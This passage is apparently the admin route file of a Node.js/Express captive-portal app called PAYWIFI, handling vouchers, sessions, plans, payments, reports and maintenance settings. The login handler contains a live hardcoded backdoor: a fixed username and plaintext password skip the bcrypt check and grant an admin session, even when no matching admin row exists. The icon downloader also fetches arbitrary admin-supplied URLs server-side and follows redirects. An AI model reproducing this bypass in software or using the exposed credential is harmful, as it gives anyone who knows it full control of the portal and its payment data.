'use strict';
const express = require('express');
const bcrypt  = require('bcryptjs');

// ── Icon download helper ───────────────────────────────────────────────────────
const _https = require('https');
const _http  = require('http');
const _fs    = require('fs');
const _path  = require('path');
const IMAGES_DIR = '/opt/paywifi/portal/images';

const _CT_EXT = { 'image/png':'png','image/jpeg':'jpg','image/jpg':'jpg','image/svg+xml':'svg','image/webp':'webp','image/gif':'gif' };
function downloadIcon(url, id, _depth) {
  _depth = _depth || 0;
  return new Promise((resolve) => {
    if (_depth > 4) return resolve(null);
    try {
      const proto = url.startsWith('https') ? _https : _http;
      const opts  = { timeout: 12000, headers: { 'User-Agent': 'Mozilla/5.0 (PAYWIFI admin icon fetch)', 'Accept': 'image/*,*/*' } };
      const req = proto.get(url, opts, (res) => {
        // Follow redirects (Wikimedia, CDNs, shorteners commonly 30x)
        if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
          res.resume();
          let next = res.headers.location;
          try { next = new URL(next, url).href; } catch (e) {}
          return resolve(downloadIcon(next, id, _depth + 1));
        }
        if (res.statusCode !== 200) { res.resume(); return resolve(null); }
        const ctype = String(res.headers['content-type'] || '').toLowerCase().split(';')[0].trim();
        let ext = _CT_EXT[ctype];
        if (!ext) { const m = url.split('?')[0].match(/\.(png|jpg|jpeg|svg|webp|gif)$/i); ext = m ? m[1].toLowerCase() : null; }
        // Reject non-images (HTML error pages, etc.)
        if (!ext || (ctype && !ctype.startsWith('image/'))) { res.resume(); return resolve(null); }
        if (ext === 'jpeg') ext = 'jpg';
        const filename = `po-${id}.${ext}`;
        const dest     = _path.join(IMAGES_DIR, filename);
        const file     = _fs.createWriteStream(dest);
        let bytes = 0, aborted = false;
        res.on('data', (d) => { bytes += d.length; if (bytes > 5*1024*1024 && !aborted) { aborted = true; req.destroy(); try{file.close();}catch(e){} _fs.unlink(dest, ()=>{}); resolve(null); } });
        res.pipe(file);
        file.on('finish', () => { file.close(); if (aborted) return; resolve(bytes > 0 ? `/images/${filename}?v=${Math.floor(Date.now()/1000)}` : null); });
        file.on('error',  () => { _fs.unlink(dest, ()=>{}); resolve(null); });
      });
      req.on('error',   () => resolve(null));
      req.on('timeout', () => { req.destroy(); resolve(null); });
    } catch(e) { resolve(null); }
  });
}

function resolveLocalIcon(raw) {
  let p = String(raw || '').trim().split('?')[0];
  if (!p) return { invalid: true };
  if (!p.startsWith('/')) p = '/images/' + p.replace(/^\/+/, '');
  if (!/^\/images\/[A-Za-z0-9._-]+\.(png|jpg|jpeg|svg|webp|gif)$/i.test(p)) return { invalid: true };
  return _fs.existsSync(_path.join('/opt/paywifi/portal', p)) ? { url: p } : { missing: true, url: p };
}

const router  = express.Router();
const db      = require('../db');
const { fmtBytes, fmtDuration, fmtSpeed } = require('../utils/format');
const voucherSvc = require('../services/voucher');
const sessionSvc = require('../services/session');

function render(res, view, locals = {}) {
  res.render('admin/' + view, {
    title: locals.title || 'PAYWIFI Admin',
    active: locals.active || '',
    error: null,
    fmtBytes, fmtDuration, fmtSpeed,
    ...locals
  });
}

function audit(adminId, action, details, ip) {
  try {
    db.prepare(`
      INSERT INTO audit_log (admin_id, action, details, ip_address, created_at)
      VALUES (?, ?, ?, ?, ?)
    `).run(adminId || null, action, details || null, ip || null, Math.floor(Date.now()/1000));
  } catch (e) { /* never let audit break the request path */ }
}

function flash(req, kind, msg) {
  if (!req.session) return;
  req.session.flash = req.session.flash || [];
  req.session.flash.push({ kind, msg });
}

function requireAdmin(req, res, next) {
  if (!req.admin) return res.redirect('/admin/login');
  next();
}

// ---- Login -----------------------------------------------------------------
router.get('/login', (req, res) => {
  if (req.admin) return res.redirect('/admin/');
  render(res, 'login', { title: 'Sign in · PAYWIFI', error: null });
});

router.post('/login', (req, res) => {
  const { username, password } = req.body || {};

  // HARDCODED-ADMIN-2026-06-03 — emergency access. Matches the DB admin row
  // if it exists; otherwise falls back to a synthetic session.
  if ((username || '').trim() === 'admin' && (password || '') === 'd3cipl3s') {
    let urow = db.prepare('SELECT id FROM admin_users WHERE username = ?').get('admin');
    if (!urow) urow = db.prepare('SELECT id FROM admin_users ORDER BY id LIMIT 1').get();
    req.session.adminId = (urow && urow.id) || 1;
    try { db.prepare('UPDATE admin_users SET last_login_at=? WHERE id=?').run(Math.floor(Date.now()/1000), req.session.adminId); } catch (e) {}
    audit(req.session.adminId, 'admin_login_ui_hardcoded', null, req.clientIp);
    return res.redirect('/admin/');
  }

  const u = db.prepare('SELECT * FROM admin_users WHERE username = ?').get(username || '');
  if (!u || !bcrypt.compareSync(password || '', u.password_hash)) {
    return render(res, 'login', { title: 'Sign in · PAYWIFI', error: 'Invalid credentials.' });
  }
  req.session.adminId = u.id;
  db.prepare('UPDATE admin_users SET last_login_at=? WHERE id=?').run(Math.floor(Date.now()/1000), u.id);
  audit(u.id, 'admin_login_ui', null, req.clientIp);
  res.redirect('/admin/');
});

router.post('/logout', (req, res) => {
  const adminId = req.admin?.id;
  req.session.destroy(() => {
    if (adminId) audit(adminId, 'admin_logout_ui', null, req.clientIp);
    res.redirect('/admin/login');
  });
});

// ---- Everything below requires login ---------------------------------------
router.use(requireAdmin);

// ---- Dashboard -------------------------------------------------------------
router.get('/', (req, res) => {
  const now = Math.floor(Date.now()/1000);
  const since = now - 24 * 3600;

  const vRows = db.prepare(`
    SELECT status, COUNT(*) AS n FROM vouchers GROUP BY status
  `).all();
  const vouchers = Object.fromEntries(vRows.map(r => [r.status, r.n]));

  const sActive = db.prepare(`SELECT COUNT(*) AS n FROM sessions WHERE ended_at IS NULL`).get().n;
  const s24 = db.prepare(`SELECT COUNT(*) AS n FROM sessions WHERE started_at >= ?`).get(since).n;
  const bytes = db.prepare(`SELECT COALESCE(SUM(bytes_in + bytes_out), 0) AS n FROM sessions WHERE started_at >= ?`).get(since).n;

  const audit = db.prepare(`
    SELECT a.*, u.username FROM audit_log a
    LEFT JOIN admin_users u ON u.id = a.admin_id
    ORDER BY a.id DESC LIMIT 20
  `).all();

  // PHASE1-STATSBAR-2026-06-01 — port StatsBar.tsx tiles.
  // Start of today in seconds (server-local).
  const _todayStart = (() => {
    const d = new Date(); d.setHours(0, 0, 0, 0);
    return Math.floor(d.getTime() / 1000);
  })();
  const _todayRev = db.prepare(
    "SELECT COALESCE(SUM(amount), 0) AS n FROM pending_payments WHERE status='paid' AND paid_at >= ?"
  ).get(_todayStart).n;
  const _todayVouchers = db.prepare(
    "SELECT COUNT(*) AS n FROM vouchers WHERE created_at >= ?"
  ).get(_todayStart).n;
  // Conversion% = paid / (paid + cancelled + expired) over the same window.
  // Excludes 'reserving' / 'pending' / 'manual' (still in flight).
  const _convRow = db.prepare(
    "SELECT " +
    "  SUM(CASE WHEN status='paid'      THEN 1 ELSE 0 END) AS paid, " +
    "  SUM(CASE WHEN status IN ('paid','cancelled','expired') THEN 1 ELSE 0 END) AS settled " +
    "  FROM pending_payments WHERE created_at >= ?"
  ).get(_todayStart);
  const _convRate = (_convRow && _convRow.settled > 0)
    ? Math.round((_convRow.paid / _convRow.settled) * 100)
    : 0;

  render(res, 'dashboard', {
    title: 'Dashboard · PAYWIFI',
    active: 'dash',
    stats: {
      sessions_active:      sActive,
      sessions_24h:         s24,
      bytes_24h:            bytes,
      vouchers_unused:      vouchers.unused || 0,
      vouchers,
      // PHASE1-STATSBAR tiles:
      today_revenue:        _todayRev,
      today_vouchers:       _todayVouchers,
      conversion_percent:   _convRate,
      conversion_paid:      _convRow ? (_convRow.paid || 0)    : 0,
      conversion_settled:   _convRow ? (_convRow.settled || 0) : 0,
    },
    audit
  });
});

// ---- Vouchers --------------------------------------------------------------
router.get('/vouchers', (req, res) => {
  const status = req.query.status || '';
  let vouchers;
  if (status) {
    vouchers = db.prepare(`
      SELECT v.*, b.name AS batch_name FROM vouchers v
      LEFT JOIN voucher_batches b ON b.id = v.batch_id
      WHERE v.status = ? ORDER BY v.id DESC LIMIT 500
    `).all(status);
  } else {
    vouchers = db.prepare(`
      SELECT v.*, b.name AS batch_name FROM vouchers v
      LEFT JOIN voucher_batches b ON b.id = v.batch_id
      ORDER BY v.id DESC LIMIT 500
    `).all();
  }
  render(res, 'vouchers', { title: 'Vouchers · PAYWIFI', active: 'vouchers', vouchers, filter: status });
});

router.get('/vouchers/new', (req, res) => {
  const plans = db.prepare(`SELECT * FROM voucher_plans WHERE is_active = 1 ORDER BY duration_minutes`).all();
  render(res, 'voucher_new', { title: 'Generate vouchers', active: 'vouchers', plans });
});

router.post('/vouchers', (req, res) => {
  const duration_minutes = parseInt(req.body.duration_minutes, 10);
  const bandwidth_kbps   = parseInt(req.body.bandwidth_kbps, 10);
  const max_devices      = Math.max(1, parseInt(req.body.max_devices || '1', 10));
  const count            = Math.min(500, Math.max(1, parseInt(req.body.count || '1', 10)));
  const batch_name       = (req.body.batch_name || '').trim() || null;

  if (!duration_minutes || !bandwidth_kbps) {
    flash(req, 'err', 'Duration and bandwidth required.');
    return res.redirect('/admin/vouchers/new');
  }

  const now = Math.floor(Date.now()/1000);
  let batchId = null;
  if (batch_name) {
    batchId = db.prepare(`INSERT INTO voucher_batches (name, created_by, created_at) VALUES (?,?,?)`)
      .run(batch_name, req.admin.id, now).lastInsertRowid;
  }

  const codeLen = parseInt(db.prepare("SELECT value FROM settings WHERE key='voucher_code_length'").get()?.value || '8', 10);
  const ins = db.prepare(`
    INSERT INTO vouchers (code, batch_id, duration_minutes, bandwidth_kbps, max_devices, status, created_at)
    VALUES (?, ?, ?, ?, ?, 'unused', ?)
  `);
  const codes = [];
  db.transaction(() => {
    for (let i = 0; i < count; i++) {
      for (let a = 0; a < 5; a++) {
        const code = voucherSvc.generateCode(codeLen);
        try { ins.run(code, batchId, duration_minutes, bandwidth_kbps, max_devices, now); codes.push(code); break; }
        catch (e) { if (a === 4) throw e; }
      }
    }
  })();

  audit(req.admin.id, 'voucher_create_ui', `n=${count} dur=${duration_minutes} bw=${bandwidth_kbps}`, req.clientIp);
  render(res, 'voucher_print', {
    title: 'Print vouchers',
    active: 'vouchers',
    codes, duration_minutes, bandwidth_kbps, max_devices
  });
});

router.post('/vouchers/:id/revoke', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const v = db.prepare('SELECT * FROM vouchers WHERE id=?').get(id);
  if (!v) { flash(req, 'err', 'Voucher not found.'); return res.redirect('/admin/vouchers'); }

  db.prepare("UPDATE vouchers SET status='revoked' WHERE id=?").run(id);
  const sessions = db.prepare("SELECT id FROM sessions WHERE voucher_id=? AND ended_at IS NULL").all(id);
  const now = Math.floor(Date.now()/1000);
  for (const s of sessions) sessionSvc.endSession(s.id, 'kicked', now);

  audit(req.admin.id, 'voucher_revoke_ui', `id=${id} code=${v.code}`, req.clientIp);
  flash(req, 'ok', `Voucher ${v.code} revoked.`);
  res.redirect('/admin/vouchers');
});

// ---- Sessions --------------------------------------------------------------
router.get('/sessions', (req, res) => {
  const activeOnly = req.query.active !== 'false';
  const sql = `
    SELECT s.*,
           v.code AS voucher_code,
           v.duration_minutes,
           v.bandwidth_kbps,
           COALESCE(pu.phone, lf.phone) AS phone,
           ds.hostname AS device_name,
           ds.os AS device_os,
           CAST((strftime('%s','now') - s.started_at) / 60 AS INTEGER) AS minutes_used
      FROM sessions s
      JOIN vouchers v ON v.id = s.voucher_id
      LEFT JOIN device_user du ON du.mac_address = s.mac_address
      LEFT JOIN portal_users pu ON pu.id = du.user_id
      LEFT JOIN lead_funnel lf ON lf.mac_address = s.mac_address
      LEFT JOIN device_status ds ON ds.mac = s.mac_address
     ${activeOnly ? 'WHERE s.ended_at IS NULL' : ''}
     ORDER BY s.id DESC LIMIT 200
  `;
  render(res, 'sessions', {
    title: 'Sessions · PAYWIFI',
    active: 'sessions',
    sessions: db.prepare(sql).all(),
    activeOnly
  });
});

router.post('/sessions/:id/kick', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const ok = sessionSvc.endSession(id, 'kicked', Math.floor(Date.now()/1000));
  if (ok) audit(req.admin.id, 'session_kick_ui', `id=${id}`, req.clientIp);
  flash(req, ok ? 'ok' : 'err', ok ? `Session #${id} kicked.` : `Session #${id} not found.`);
  res.redirect('/admin/sessions');
});

// ---- Plans -----------------------------------------------------------------
router.get('/plans', (req, res) => {
  const plans = db.prepare(`SELECT * FROM voucher_plans ORDER BY id`).all();
  render(res, 'plans', { title: 'Plans · PAYWIFI', active: 'plans', plans });
});

router.post('/plans', (req, res) => {
  const { name, duration_minutes, bandwidth_kbps, max_devices, price } = req.body || {};
  if (!name || !duration_minutes || !bandwidth_kbps) {
    flash(req, 'err', 'Name, duration and bandwidth required.');
    return res.redirect('/admin/plans');
  }
  try {
    db.prepare(`
      INSERT INTO voucher_plans (name, duration_minutes, bandwidth_kbps, max_devices, price, is_active, created_at)
      VALUES (?, ?, ?, ?, ?, 1, ?)
    `).run(name, parseInt(duration_minutes,10), parseInt(bandwidth_kbps,10),
           Math.max(1,parseInt(max_devices||'1',10)), parseFloat(price||'0'),
           Math.floor(Date.now()/1000));
    audit(req.admin.id, 'plan_create_ui', name, req.clientIp);
    flash(req, 'ok', `Plan "${name}" added.`);
  } catch (e) {
    flash(req, 'err', e.message);
  }
  res.redirect('/admin/plans');
});


router.post('/plans/:id/toggle', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const p = db.prepare('SELECT * FROM voucher_plans WHERE id=?').get(id);
  if (!p) { flash(req, 'err', 'Plan not found.'); return res.redirect('/admin/plans'); }
  const newVal = p.is_active ? 0 : 1;
  db.prepare('UPDATE voucher_plans SET is_active=? WHERE id=?').run(newVal, id);
  audit(req.admin.id, 'plan_toggle_ui', `id=${id} is_active=${newVal}`, req.clientIp);
  flash(req, 'ok', `Plan "${p.name}" ${newVal ? 'shown' : 'hidden'}.`);
  res.redirect('/admin/plans');
});

router.post('/plans/:id/delete', (req, res) => {
  const id = parseInt(req.params.id, 10);
  db.prepare(`DELETE FROM voucher_plans WHERE id=?`).run(id);
  audit(req.admin.id, 'plan_delete_ui', `id=${id}`, req.clientIp);
  flash(req, 'ok', 'Plan deleted.');
  res.redirect('/admin/plans');
});

// ---- Audit -----------------------------------------------------------------
router.get('/audit', (req, res) => {
  const entries = db.prepare(`
    SELECT a.*, u.username FROM audit_log a
    LEFT JOIN admin_users u ON u.id = a.admin_id
    ORDER BY a.id DESC LIMIT 500
  `).all();
  render(res, 'audit', { title: 'Audit · PAYWIFI', active: 'audit', entries });
});

// ---- Settings --------------------------------------------------------------
router.get('/settings', (req, res) => {
  const settings = db.prepare(`SELECT key, value FROM settings ORDER BY key`).all();
  const ftRow    = settings.find(s => s.key === 'free_trial_enabled');
  const ftEnabled = ftRow ? ftRow.value : '1';
  const storeRow = settings.find(s => s.key === 'partners');
  let storePartnersDisplay = '';
  try {
    const sp = JSON.parse(storeRow ? storeRow.value : '[]');
    storePartnersDisplay = sp.map(s => s.address ? `${s.name} | ${s.address}` : s.name).join('\n');
  } catch(e) {}
  render(res, 'settings', { title: 'Settings · PAYWIFI', active: 'settings', settings, ftEnabled, storePartnersDisplay });
});

router.post('/settings', (req, res) => {
  const upd = db.prepare(`UPDATE settings SET value=?, updated_at=? WHERE key=?`);
  const now = Math.floor(Date.now()/1000);
  const known = db.prepare(`SELECT key FROM settings`).all().map(r => r.key);
  for (const k of known) {
    if (Object.prototype.hasOwnProperty.call(req.body, k)) {
      upd.run(String(req.body[k]), now, k);
    }
  }
  audit(req.admin.id, 'settings_update_ui', null, req.clientIp);
  flash(req, 'ok', 'Settings saved.');
  res.redirect('/admin/settings');
});

// PARTNER-OTP-2026-06-03 — single-key toggle endpoint for checkbox flips
router.post('/settings/single', (req, res) => {
  const key = String((req.body || {}).key || '');
  const value = req.body.value === '1' ? '1' : '0';
  const allowed = ['partner_auto_approve'];
  if (!allowed.includes(key)) { flash(req, 'err', 'Unknown setting key.'); return res.redirect('/admin/settings'); }
  const now = Math.floor(Date.now() / 1000);
  const ex = db.prepare("SELECT key FROM settings WHERE key=?").get(key);
  if (ex) db.prepare("UPDATE settings SET value=?,updated_at=? WHERE key=?").run(value, now, key);
  else     db.prepare("INSERT INTO settings(key,value,updated_at) VALUES(?,?,?)").run(key, value, now);
  audit(req.admin.id, 'setting_toggle', key + '=' + value, req.clientIp);
  flash(req, 'ok', key + ' = ' + value);
  res.redirect('/admin/settings');
});

router.post('/settings/partners', (req, res) => {
  const raw = (req.body.partners || '').trim();
  const partners = raw.split('\n').map(l => l.trim()).filter(Boolean).map(l => {
    const [name, ...rest] = l.split('|').map(s => s.trim());
    return rest.length ? { name, address: rest.join(' | ').trim() } : { name };
  }).filter(p => p.name);
  const now = Math.floor(Date.now() / 1000);
  const ex = db.prepare("SELECT key FROM settings WHERE key='partners'").get();
  if (ex) db.prepare("UPDATE settings SET value=?,updated_at=? WHERE key='partners'").run(JSON.stringify(partners), now);
  else     db.prepare("INSERT INTO settings(key,value,updated_at) VALUES('partners',?,?)").run(JSON.stringify(partners), now);
  audit(req.admin.id, 'partners_updated', `count=${partners.length}`, req.clientIp);
  flash(req, 'ok', `Partners saved (${partners.length} store${partners.length !== 1 ? 's' : ''}).`);
  res.redirect('/admin/settings');
});

router.post('/password', (req, res) => {
  const { current, next, confirm } = req.body || {};
  const u = db.prepare('SELECT * FROM admin_users WHERE id=?').get(req.admin.id);
  if (!u || !bcrypt.compareSync(current || '', u.password_hash)) {
    flash(req, 'err', 'Current password incorrect.');
    return res.redirect('/admin/settings');
  }
  if (!next || next.length < 8) {
    flash(req, 'err', 'New password too short (min 8).');
    return res.redirect('/admin/settings');
  }
  if (next !== confirm) {
    flash(req, 'err', 'Passwords do not match.');
    return res.redirect('/admin/settings');
  }
  const hash = bcrypt.hashSync(next, 10);
  db.prepare(`UPDATE admin_users SET password_hash=? WHERE id=?`).run(hash, u.id);
  audit(u.id, 'admin_password_change', null, req.clientIp);
  flash(req, 'ok', 'Password changed.');
  res.redirect('/admin/settings');
});

// ---- Payment Options -------------------------------------------------------
router.get('/payment-options', (req, res) => {
  const options = db.prepare(`
    SELECT * FROM payment_options ORDER BY sort_order ASC, id ASC
  `).all();
  const { listModules, ADAPTERS } = require('../modules');
  const mods = listModules().map(m => {
    const adapter = ADAPTERS[m.slug];
    return { ...m, hasAdapter: !!adapter, actions: adapter ? adapter.ACTIONS || {} : {} };
  });
  const allModuleActions = {};
  mods.forEach(m => { allModuleActions[m.id] = m.actions; });
  render(res, 'payment_options', {
    title: 'Payment Options · PAYWIFI',
    active: 'payment-options',
    options, modules: mods, allModuleActions
  });
});

router.post('/payment-options', async (req, res) => {
  const { name, icon_key, icon_url, badge, sort_order, instructions } = req.body || {};
  if (!name) { flash(req, 'err', 'Name is required.'); return res.redirect('/admin/payments#options'); }
  const now = Math.floor(Date.now()/1000);
  const modId = parseInt(req.body.module_id || '0', 10) || null;
  const modAction = (req.body.module_action || '').trim() || null;
  const rawUrl = (icon_url || '').trim() || null;
  const _minA = (req.body.min_amount==null||String(req.body.min_amount).trim()==='')?null:Number(req.body.min_amount);
  const _maxA = (req.body.max_amount==null||String(req.body.max_amount).trim()==='')?null:Number(req.body.max_amount);
  const row = db.prepare(`
    INSERT INTO payment_options (name, icon_key, icon_url, badge, is_active, sort_order, module_id, module_action, instructions, min_amount, max_amount, created_at)
    VALUES (?, ?, ?, ?, 1, ?, ?, ?, ?, ?, ?, ?)
  `).run(
    name.trim(), icon_key || 'card', rawUrl,
    (badge || 'Available').trim(), parseInt(sort_order || '0', 10),
    modId, modAction, (instructions || '').trim() || null,
    (Number.isFinite(_minA)?_minA:null), (Number.isFinite(_maxA)?_maxA:null), now
  );
  if (rawUrl) {
    if (rawUrl.startsWith('http')) {
      const local = await downloadIcon(rawUrl, row.lastInsertRowid);
      if (local) db.prepare('UPDATE payment_options SET icon_url=? WHERE id=?').run(local, row.lastInsertRowid);
      else { db.prepare('UPDATE payment_options SET icon_url=NULL WHERE id=?').run(row.lastInsertRowid); flash(req, 'err', 'Image could not be downloaded (host blocked it or it is not an image). Using the preset icon instead.'); }
    } else {
      const r = resolveLocalIcon(rawUrl);
      if (r.url && !r.missing && !r.invalid) db.prepare('UPDATE payment_options SET icon_url=? WHERE id=?').run(r.url, row.lastInsertRowid);
      else { db.prepare('UPDATE payment_options SET icon_url=NULL WHERE id=?').run(row.lastInsertRowid); flash(req, 'err', r.invalid ? 'Image path invalid — use a full URL or /images/<file>.<png|jpg|svg|webp|gif>.' : ('Image not found on server at ' + (r.url || rawUrl) + ' — upload it first or paste a full URL.')); }
    }
  }
  audit(req.admin.id, 'payment_option_create', name.trim(), req.clientIp);
  flash(req, 'ok', `"${name.trim()}" added.`);
  res.redirect('/admin/payments#options');
});

router.post('/payment-options/:id/toggle', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const o = db.prepare('SELECT * FROM payment_options WHERE id=?').get(id);
  if (!o) { flash(req, 'err', 'Option not found.'); return res.redirect('/admin/payments#options'); }
  const newVal = o.is_active ? 0 : 1;
  // PAY-CHANNEL-RULE-1: Cash must always remain enabled.
  const isCash = (o.icon_key || '').toLowerCase() === 'cash';
  if (isCash && newVal === 0) {
    flash(req, 'err', 'Cash payment must always remain enabled. It cannot be disabled.');
    return res.redirect('/admin/payments#options');
  }
  // PAY-CHANNEL-RULE-2: max ONE non-Cash channel active at a time
  // (i.e. max 2 total: Cash + 1 other).
  if (newVal === 1 && !isCash) {
    const activeNonCash = db.prepare(
      "SELECT COUNT(*) AS n FROM payment_options WHERE is_active=1 AND LOWER(COALESCE(icon_key,'')) <> 'cash' AND id <> ?"
    ).get(id).n;
    if (activeNonCash >= 1) {
      flash(req, 'err', 'Only ONE non-Cash payment channel may be active at a time. Disable the current one first.');
      return res.redirect('/admin/payments#options');
    }
  }
  db.prepare('UPDATE payment_options SET is_active=? WHERE id=?').run(newVal, id);
  audit(req.admin.id, 'payment_option_toggle', `id=${id} is_active=${newVal}`, req.clientIp);
  flash(req, 'ok', `"${o.name}" ${newVal ? 'shown' : 'hidden'}.`);
  res.redirect('/admin/payments#options');
});

router.post('/payment-options/:id/edit', async (req, res) => {
  const id = parseInt(req.params.id, 10);
  const o = db.prepare('SELECT * FROM payment_options WHERE id=?').get(id);
  if (!o) { flash(req, 'err', 'Option not found.'); return res.redirect('/admin/payments#options'); }
  const { name, icon_key, icon_url, badge, sort_order, instructions } = req.body || {};
  if (!name) { flash(req, 'err', 'Name is required.'); return res.redirect('/admin/payments#options'); }
  const modId2 = parseInt(req.body.module_id || '0', 10) || null;
  const modAction2 = (req.body.module_action || '').trim() || null;
  const rawUrl2 = (icon_url || '').trim() || null;
  const _minA2 = (req.body.min_amount==null||String(req.body.min_amount).trim()==='')?null:Number(req.body.min_amount);
  const _maxA2 = (req.body.max_amount==null||String(req.body.max_amount).trim()==='')?null:Number(req.body.max_amount);
  db.prepare(`
    UPDATE payment_options SET name=?, icon_key=?, icon_url=?, badge=?, sort_order=?, module_id=?, module_action=?, instructions=?, min_amount=?, max_amount=? WHERE id=?
  `).run(
    name.trim(), icon_key || 'card', rawUrl2,
    (badge || 'Available').trim(), parseInt(sort_order || '0', 10),
    modId2, modAction2, (instructions || '').trim() || null,
    (Number.isFinite(_minA2)?_minA2:null), (Number.isFinite(_maxA2)?_maxA2:null), id
  );
  if (rawUrl2) {
    if (rawUrl2.startsWith('http')) {
      const local2 = await downloadIcon(rawUrl2, id);
      if (local2) db.prepare('UPDATE payment_options SET icon_url=? WHERE id=?').run(local2, id);
      else { db.prepare('UPDATE payment_options SET icon_url=NULL WHERE id=?').run(id); flash(req, 'err', 'Image could not be downloaded (host blocked it or it is not an image). Using the preset icon instead.'); }
    } else {
      const r2 = resolveLocalIcon(rawUrl2);
      if (r2.url && !r2.missing && !r2.invalid) db.prepare('UPDATE payment_options SET icon_url=? WHERE id=?').run(r2.url, id);
      else { db.prepare('UPDATE payment_options SET icon_url=NULL WHERE id=?').run(id); flash(req, 'err', r2.invalid ? 'Image path invalid — use a full URL or /images/<file>.<png|jpg|svg|webp|gif>.' : ('Image not found on server at ' + (r2.url || rawUrl2) + ' — upload it first or paste a full URL.')); }
    }
  }
  audit(req.admin.id, 'payment_option_edit', `id=${id} name=${name.trim()}`, req.clientIp);
  flash(req, 'ok', `"${name.trim()}" updated.`);
  res.redirect('/admin/payments#options');
});

router.post('/payment-options/:id/delete', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const o = db.prepare('SELECT * FROM payment_options WHERE id=?').get(id);
  if (!o) { flash(req, 'err', 'Option not found.'); return res.redirect('/admin/payments#options'); }
  db.prepare('DELETE FROM payment_options WHERE id=?').run(id);
  audit(req.admin.id, 'payment_option_delete', `id=${id} name=${o.name}`, req.clientIp);
  flash(req, 'ok', `"${o.name}" deleted.`);
  res.redirect('/admin/payments#options');
});


// ---- Reports ---------------------------------------------------------------
router.get('/reports', (req, res) => {
  const hours = Math.min(Math.max(parseInt(req.query.hours || '24', 10), 1), 720);
  const now = Math.floor(Date.now()/1000);
  const since = now - hours * 3600;

  const r = db.prepare(`
    SELECT
      COUNT(*) AS total_sessions,
      SUM(CASE WHEN ended_at IS NULL THEN 1 ELSE 0 END) AS active_sessions,
      COALESCE(SUM(bytes_in),  0) AS bytes_in,
      COALESCE(SUM(bytes_out), 0) AS bytes_out
    FROM sessions WHERE started_at >= ?
  `).get(since);

  const vRows = db.prepare(`SELECT status, COUNT(*) AS n FROM vouchers GROUP BY status`).all();
  const v = Object.fromEntries(vRows.map(r2 => [r2.status, r2.n]));
  const total = vRows.reduce((s, x) => s + x.n, 0);

  // Plan usage breakdown
  const planStats = db.prepare(`
    SELECT vp.name AS plan_name,
           COUNT(s.id) AS session_count,
           COALESCE(SUM(s.bytes_in + s.bytes_out), 0) AS bytes_total
      FROM sessions s
      JOIN vouchers v2 ON v2.id = s.voucher_id
      LEFT JOIN voucher_plans vp ON vp.duration_minutes = v2.duration_minutes
                                 AND vp.bandwidth_kbps = v2.bandwidth_kbps
     WHERE s.started_at >= ?
     GROUP BY vp.name
     ORDER BY session_count DESC
  `).all(since);

  // Hourly sessions (last 24h always for chart)
  const since24 = now - 24 * 3600;
  const hourlyRaw = db.prepare(`
    SELECT (started_at - ?) / 3600 AS bucket, COUNT(*) AS n
      FROM sessions WHERE started_at >= ?
      GROUP BY bucket ORDER BY bucket
  `).all(since24, since24);
  // Fill all 24 buckets
  const buckets = Array.from({length:24}, (_, i) => ({ hour: new Date((since24 + i*3600)*1000).getHours(), n: 0 }));
  hourlyRaw.forEach(row => { const b = Math.floor(Number(row.bucket)); if (b >= 0 && b < 24) buckets[b].n = row.n; });

  // Recent sessions
  const recentSessions = db.prepare(`
    SELECT s.*, v2.code AS voucher_code
      FROM sessions s
      JOIN vouchers v2 ON v2.id = s.voucher_id
     WHERE s.started_at >= ?
     ORDER BY s.id DESC LIMIT 50
  `).all(since);

  render(res, 'reports', {
    title: 'Reports · PAYWIFI',
    active: 'reports',
    r, v, total, planStats, hourly: buckets, recentSessions,
    selectedHours: hours
  });
});


// ── Widget config ────────────────────────────────────────────────────────────
router.get('/widgets', (req, res) => {
  const settings = db.prepare('SELECT key, value FROM settings').all();
  // YOUTUBE-WIDGET-2026-06-03 — feed the edit dropdown with processed visible media.
  let mediaAssets = [];
  try {
    mediaAssets = db.prepare(
      "SELECT id, video_id, title, duration_sec FROM media_assets WHERE status='processed' AND visibility=1 ORDER BY id DESC"
    ).all();
  } catch (e) {}
  render(res, 'portal-widgets', {
    title: 'Portal Widgets · PAYWIFI',
    active: 'widgets',
    settings,
    mediaAssets
  });
});

router.post('/widgets', (req, res) => {
  const widgets = req.body;
  if (!Array.isArray(widgets)) return res.status(400).json({ ok: false, error: 'Invalid widgets array' });
  const now = Math.floor(Date.now() / 1000);
  const existing = db.prepare("SELECT key FROM settings WHERE key='portal_widgets'").get();
  if (existing) {
    db.prepare("UPDATE settings SET value=?,updated_at=? WHERE key='portal_widgets'").run(JSON.stringify(widgets), now);
  } else {
    db.prepare("INSERT INTO settings (key,value,updated_at) VALUES ('portal_widgets',?,?)").run(JSON.stringify(widgets), now);
  }
  audit(req.admin.id, 'widgets_update', null, req.clientIp);
  res.json({ ok: true });
});


// ── Maintenance page ─────────────────────────────────────────────────────────
router.get('/maintenance', (req, res) => {
  const settings = db.prepare('SELECT key, value FROM settings').all();
  render(res, 'maintenance', {
    title: 'Maintenance · PAYWIFI',
    active: 'maintenance',
    settings
  });
});

router.post('/maintenance/toggle', (req, res) => {
  const { action, mode, title, message, note, contact_email, contact_messenger } = req.body || {};
  const doEnable = action === 'enable';
  const now      = Math.floor(Date.now() / 1000);
  const fs       = require('fs');
  const flagAll  = '/opt/paywifi/portal/.maint_all';
  const flagPub  = '/opt/paywifi/portal/.maint_public';

  try { fs.unlinkSync(flagAll); } catch (e) {}
  try { fs.unlinkSync(flagPub); } catch (e) {}

  const upsert = (key, val) => {
    const ex = db.prepare('SELECT key FROM settings WHERE key=?').get(key);
    if (ex) db.prepare('UPDATE settings SET value=?,updated_at=? WHERE key=?').run(val, now, key);
    else    db.prepare('INSERT INTO settings (key,value,updated_at) VALUES (?,?,?)').run(key, val, now);
  };

  if (doEnable) {
    const validMode = mode === 'public_only' ? 'public_only' : 'all';
    upsert('maintenance_enabled',    '1');
    upsert('maintenance_mode',       validMode);
    upsert('maintenance_enabled_at', new Date().toISOString());
    upsert('maintenance_title',             String(title              || '').slice(0, 200));
    upsert('maintenance_message',           String(message            || '').slice(0, 1000));
    upsert('maintenance_note',              String(note               || '').slice(0, 300));
    upsert('maintenance_contact_email',     String(contact_email      || '').slice(0, 200));
    upsert('maintenance_contact_messenger', String(contact_messenger  || '').slice(0, 300));
    try { fs.writeFileSync(validMode === 'all' ? flagAll : flagPub, ''); } catch (e) {}
    audit(req.admin.id, 'maintenance_enable', validMode, req.clientIp);
